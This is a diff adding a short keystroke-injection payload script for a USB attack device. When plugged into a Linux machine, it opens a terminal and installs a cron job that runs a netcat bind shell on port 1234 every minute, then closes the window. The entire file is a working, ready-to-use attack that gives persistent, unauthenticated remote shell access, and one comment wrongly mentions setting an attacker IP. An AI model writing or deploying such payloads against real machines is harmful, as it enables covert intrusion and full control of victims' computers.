@@ -1,0 +1,17 @@
+REM Title: Persistent Bind Shell
+REM Author: UndedInside
+REM Description: Creates a cronjob that starts a bind shell
+
+REM Open terminal
+DEFAULT_DELAY 700
+ALT t
+
+REM Create cronjob to start listening on port 1234
+REM The attacker IP will need to be set below
+STRING echo "* * * * * nc -l -p 1234 -e /bin/bash" > cron
+ENTER
+STRING crontab -i cron
+ENTER
+
+REM Since the job has now been started we can close the window
+ALT F4
